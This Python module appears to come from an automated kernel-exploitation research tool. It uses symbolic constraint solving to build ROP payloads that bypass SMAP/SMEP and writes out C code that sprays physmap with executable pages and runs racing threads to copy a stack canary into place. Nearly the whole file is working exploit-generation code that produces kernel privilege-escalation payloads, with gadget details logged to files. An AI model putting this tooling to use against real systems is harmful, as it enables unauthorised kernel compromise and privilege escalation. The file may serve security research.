"""
filename: _payload_generation
author: ww9210
"""
import pwnlib
import colorama
import time
from IPython import embed

class PayloadGenerationMixin:
    def generate_physmap_spray_payload(self, payload):
        minimal_rdx_disclosure = self.current_disclosure_gadget[1] + 8
        WORMHOLE = 0x41414000
        CANARY_LOCATION_SRC = 0x41414ff8
        SPACESHIP = 0x91919000
        CANARY_LOCATION_DST = 0x9191a000 - self.current_smash_payload_len + self.current_smash_gadget[1]
        PAYLOAD_START = 0x9191a000 - self.current_smash_payload_len
        number_of_saved_register = self.current_smash_gadget[0]
        ROP_FIRST_GADGET_LOCATION = 0x9191a000 - self.current_smash_payload_len + self.current_smash_gadget[1] + 8 + number_of_saved_register*8
        NUM_OF_TRANSPORT = 10
        length_in_qword = len(payload) // 8
        c_payload = "// automatically generated osok payload \n// contact: ww9210@gmail.com\n"
        c_payload += '''/*
add the following code to your rip control poc
    do_mmap();
    mmap_wormhole();
    mmap_spaceship();
    set_spaceship();
    do_transport=1;
    launch_transport();
    //rop start at '''+hex(ROP_FIRST_GADGET_LOCATION)+'''
*/
'''
        c_payload += "#define PAGESIZE 4096\n"
        c_payload += "#define SPRAY_SIZE_IN_MB 200\n"
        c_payload += "#define MMAP_BASE 0x30000000\n"
        c_payload += "#define SPACESHIP " + hex(SPACESHIP) + "\n"
        c_payload += "#define CANARY_LOCATION_DST " + hex(CANARY_LOCATION_DST) + "\n"
        c_payload += "#define WORMHOLE " + hex(WORMHOLE) + "\n"
        c_payload += "#define CANARY_LOCATION_SRC " + hex(CANARY_LOCATION_SRC) + "\n"
        c_payload += "#define NUM_OF_TRANSPORT " + hex(NUM_OF_TRANSPORT) + "\n"
        c_payload += "#define PAYLOAD_START " + hex(PAYLOAD_START) + "\n"

        c_payload += '''
#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>

volatile int do_transport;
unsigned char osok_rop_payload[4096];
void* mmap_wormhole(){
    void* ret =  mmap((void*)WORMHOLE, PAGESIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if(ret<0){
        perror("wormhole");
        exit(0);
    }
    *(unsigned long*)ret=0x9210;
    return ret;
}

void* mmap_spaceship(){
    void *ret = mmap((void*)SPACESHIP, PAGESIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if(ret<0){
        perror("wormhole");
        exit(0);
    }
    *(unsigned long*)ret=0x9210;
    //memset(ret+8,'\x41',0xff7);
    memcpy(ret,osok_rop_payload,0x1000);
    return ret;
}

void set_spaceship(){
    unsigned long *p = (unsigned long*)PAYLOAD_START;
    p[0]=0xdeadbeef;
}

#pragma OPTIMIZE OFF
void* transport(void* arg){
        //unsigned long t2=*(unsigned long*)CANARY_LOCATION_SRC;
        while(do_transport)
        //if(*(unsigned long*)CANARY_LOCATION_DST !=
                //*(unsigned long*)CANARY_LOCATION_SRC)
        {
            unsigned long* tmp = (unsigned long*)CANARY_LOCATION_DST;
            unsigned long t1 = *(unsigned long*)CANARY_LOCATION_SRC;
            memcpy((char*)tmp,CANARY_LOCATION_SRC,8);
        }
}
#pragma OPTIMIZE ON

void launch_transport()
{
    int ret,i;
    pthread_t th[NUM_OF_TRANSPORT];

    for(i=0; i<NUM_OF_TRANSPORT; i++){
        ret = pthread_create(&th[0], 0, transport, NULL);
        if(ret<0){
            perror("pthread_create");
        }
    }
    return;
}

void do_mmap(){
    int i;
    int pagesize = PAGESIZE;
    unsigned long target;
    void * addr;
    int mmap_num = SPRAY_SIZE_IN_MB * 256;
    for(i = 0; i < mmap_num; i++){
        target = MMAP_BASE + pagesize*i;
        addr = mmap((void*)target, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (addr != (void*)target)
        {
            printf("%p\\n",addr);
            printf("%dMB allocated\\n",i/256);
            perror("mmap");
            exit(0);
        }
'''
        for i in range(length_in_qword):
            val = pwnlib.util.packing.u64(payload[8 * i:8 * i + 8])
            if val != 0:
                offset = i * 8
                new_statement = '        *(unsigned long*)(addr + ' + hex(offset) + ')=' + hex(val) + ';\n'
                c_payload += new_statement
        c_payload += '    }\n'
        c_payload += '}\n'

        return c_payload

    def gen_payload_smap_smep_bypass(self, state, is_fast_path=True, save_memory=True):
        """
        generate physmap spray payload
        :param state:
        :param is_fast_path: indicate whether we use range constrain( slower),
        :return:
        """
        if self.reproduce_mode is True:
            save_memory = False
        rop_payload_page = 0x91919000
        # get minimal payload length requirement which is constrained over rdx and affect the payload address
        number_of_saved_register = self.current_smash_gadget[0]
        canary_position = self.current_smash_gadget[1]
        minimal_payload_len = canary_position + number_of_saved_register * 8 + 32
        required_length = minimal_payload_len + 8
        required_length += 1  # page fault
        required_length = self.current_smash_payload_len
        required_length += 1  # page_fault

        # constrain rsi to the black hole
        if is_fast_path or self.reproduce_mode:
            print('[+] using fast path to generate payload')
            # src = rop_payload_page + 0x1000-required_length + 1
            src = 0x9191a000 - self.current_smash_payload_len
            state.add_constraints(state.regs.rsi == src)
        else:
            state.add_constraints(state.regs.rsi < 0x7fff00000000)
            state.add_constraints(state.regs.rsi > 0x10000)
        if state.regs.rdx.symbolic:
            number_of_saved_register = self.current_smash_gadget[0]
            canary_position = self.current_smash_gadget[1]
            minimal_payload_len = canary_position + number_of_saved_register * 8 + 32
            if is_fast_path or self.reproduce_mode:
                state.add_constraints(state.regs.rdx > required_length)
                state.add_constraints(state.regs.rdx < 0x200)
            else:
                state.add_constraints(state.regs.rdx > minimal_payload_len)
                state.add_constraints(state.regs.rdx < 0x200)
            # for constrain_action in state.actions:
                # print(constrain_action)
            if state.satisfiable():
                print('generating physmap spray content..., this may take a while for our old buddy solver')
                spray_content = ''
                print('getting all symbolic bytes...')
                # embed()  # investigating the disaster of constraint solving..
                # this constraint solving eat too much memory, we do not want to do that unless necessary
                for symbolic_byte in self.physmap_bytes:
                    if save_memory:
                        spray_content = '\x00'*4096
                        break
                    else:
                        spray_content += state.solver.eval(symbolic_byte, cast_to=str)
                # this constraint solving eat too much memory, we do not want to do that unless necessary
                print('generating...')
                spray_payload = self.generate_physmap_spray_payload(spray_content)
                # update payload number
                if self.lock is not None:
                    self.lock.acquire()
                self.update_generated_payload_number()
                self.num_of_generate_payload += 1
                filename = 'physmap_payload_' + '%07d' % self.num_of_generate_payload + '.h'
                filepath = 'payloads/' + filename
                with open(filepath, 'w') as f:
                    f.write(spray_payload)
                print(colorama.Fore.MAGENTA + '[+] successfully write payload to file:', filepath + \
                    colorama.Style.RESET_ALL)
                infoname = 'info_' + '%07d' % self.num_of_generate_payload + '.txt'
                infopath = 'payloads/' + infoname
                with open(infopath, 'w') as f:
                    info = ''
                    info += 'blooming gadget:' + self.current_bloom_gadget[1] + '\n'
                    info += 'forking gadget:' + self.current_forking_gadget[1] + '\n'
                    info += 'prologue gadget:' + self.current_prologue_gadget[5] + '\n'
                    info += 'disclosure gadget:' + self.current_disclosure_gadget[3] + '\n'
                    info += 'smash gadget:' + self.current_smash_gadget[3] + '\n'
                    if self.reproduce_mode:
                        info += hex(self.current_timestamp) + '\n'
                    else:
                        info += hex(int(time.time())) + '\n'
                    f.write(info)

                # prepare detail information for debugging purpose
                detailname = 'detail_' + '%07d' % self.num_of_generate_payload + '.txt'
                detailpath = 'payloads/' + detailname
                history_addrs = [addr.addr for addr in state.history_iterator]
                with open(detailpath, 'w') as f:
                    for addr in history_addrs:
                        if addr is not None:
                            f.write(hex(addr)+'\n')
                    # disclosure gadget:
                    # num_saved_registers, canary_location, canary_type, func_name, data_flow_sig, reversed_instruction, stack_size
                    #       0                   1               2           3           4               5                   6
                    hotmap, sub_gadget_entries = self.analyze_disclosure_gadget(self.current_disclosure_gadget)
                    detail = ''
                    detail += 'disclosure gadget name: ' + self.current_disclosure_gadget[3] + '\n'
                    detail += 'disclosure gadget stack size: ' + hex(self.current_disclosure_gadget[6]) + '\n'
                    detail += 'disclosure gadget canary location: ' + hex(self.current_disclosure_gadget[1]) + '\n'
                    detail += 'disclosure gadget canary type: ' + self.current_disclosure_gadget[2] + '\n'
                    detail += 'disclosure gadget number of saved registers: ' + hex(self.current_disclosure_gadget[0]) + '\n'
                    detail += 'disclosure gadget sub entries: \n'
                    for sub_entry in sub_gadget_entries:
                        detail += hex(sub_entry) + '\n'

                    # smash gadget:
                    # num_saved_registers, canary_location, canary_type, func_name, data_flow_sig, reversed_instruction
                    #       0                   1               2           3           4               5
                    detail += 'smash gadget name: ' + self.current_smash_gadget[3] + '\n'
                    detail += 'smash gadget canary location: ' + hex(self.current_smash_gadget[1]) + '\n'
                    detail += 'smash gadget canary type: ' + self.current_smash_gadget[2] + '\n'
                    detail += 'smash gadget number of saved registers: ' + hex(self.current_smash_gadget[0]) + '\n'
                    detail += 'smash gadget sub entries: \n'
                    sub_smash_gadget_entries = self.analyze_smash_gadget(self.current_smash_gadget)
                    for smash_gadget_entry in sub_smash_gadget_entries:
                        detail += hex(smash_gadget_entry) + '\n'

                    # write these detail files to file
                    f.write(detail)
                if self.lock is not None:
                    self.lock.release()

                return True
            else:
                print('unsatisfiable')
                print('something wrong with constraints.')
                # it is common sometimes these constraints can not be satisfied, let it go.
                # embed()
        else:
            print('something wrong with rdx') # should never happen
            embed()
        return False
